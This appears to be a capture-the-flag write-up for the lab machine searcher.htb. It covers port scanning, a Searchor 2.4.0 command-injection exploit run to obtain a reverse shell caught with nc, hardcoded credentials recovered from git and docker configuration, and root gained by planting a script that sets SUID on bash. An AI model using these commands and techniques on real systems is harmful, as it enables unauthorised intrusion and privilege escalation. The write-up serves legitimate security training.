#Linux #Pwned #CMDInjection #git #sudo 
```IP
10.10.11.208
```
# Enumeration
## Nmap
As always I start with a nmap port scan:
```bash
sudo nmap -sCV 10.10.11.208 -vvv -p- -oN enum/full
```
Output:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                  
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)                     
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP
The first thing we notice is that we are redirected to searcher.htb, so we will add that to hour /etc/hosts file.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210092118.png?raw=true)

When navigating to the webpage, we see a searchor 2.4.0 service:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210092303.png?raw=true)

Enumerating the webpage directories does not prove to be very useful:
```
ffuf -u http://searcher.htb/FUZZ -w /usr/share/SecLists-master/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```
```
search                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 75ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 37ms]
```

# Exploitation

Knowing that we are facing a searchor 2.4.0 service, we can search for open vulnerabilities. We do not need to dive very deep to discover a CMD injection vulnerability as shown below:

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

We can execute it with the following command:
```
./exploit.sh searcher.htb 10.10.14.3
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210093351.png?raw=true)

And we set up a listener on default port 9001:
```
nc -lvnp 9001
```

Which will receive a reverse shell as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210093402.png?raw=true)

# PrivEsc

## Manual

When doing some manual enumeration we discover that there is an aditional domain name which we will add to our /etc/hosts file and try to access, but it needs credentials:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210102440.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210102553.png?raw=true)

It seems like there are only 2 users with an interactive shell:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210093600.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210093815.png?raw=true)

There are some interesting information in the git files, for example, we now know that the user is named cody:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210094654.png?raw=true)

We can also find some hardcoded credentials in the config git file:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210094814.png?raw=true)

```
cody:jh1usoih2bkjaspwe92
```

These credentials work for svc user, and now we can see what we can do as root:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210095041.png?raw=true)

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210095408.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210095339.png?raw=true)

Toying with this script and searching online information (https://docs.docker.com/reference/cli/docker/inspect/) reveals that we can inspect docker containers information in various formats. The following command will prompt gitea docker image information in json format:

```
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq 
```

```
sudo python3 /opt/scripts/system-checkup.py docker-inspect
```

Here we will find yet another password:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210100019.png?raw=true)

```
gitea:yuiu1hoiu4i5ho1uh
```

```
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq .
```
And in the mysql_db docker image we find a new IP address from the sql server:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210100459.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210102019.png?raw=true)

We can try to access this database, but it does not seem to contain any relevant privilege escalation vector:
```
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210101050.png?raw=true)

Doing the same with the other set of credentials does not prove to be useful either:
```
mysql -h 172.19.0.3 -u root -pjI86kGUuj87guWr3RyF gitea
```

We will need to back up and take another approach. We then realize that it is possible to access in gitea.searcher.htb as administrator with password `yuiu1hoiu4i5ho1uh`:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210102656.png?raw=true)

This page contains various scripts, which includes some of the functions used by the script we can execute with sudo:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210102928.png?raw=true)

It seems that this option try to search for a full-checkup.sh script in the current directory and executes its contents. We will create it and add a line to add SUID permissions to bash:
```
echo '#!/bin/bash\nchmod u+s /bin/bash' > full-checkup.sh
```
```
chmod +x full-checkup.sh
```
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210103919.png?raw=true)

When executing the sudo script, it executes our full-checkup.sh, which will grant SUID permission to bash and we can execute it as root now:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020250210104022.png?raw=true)

Pwned!
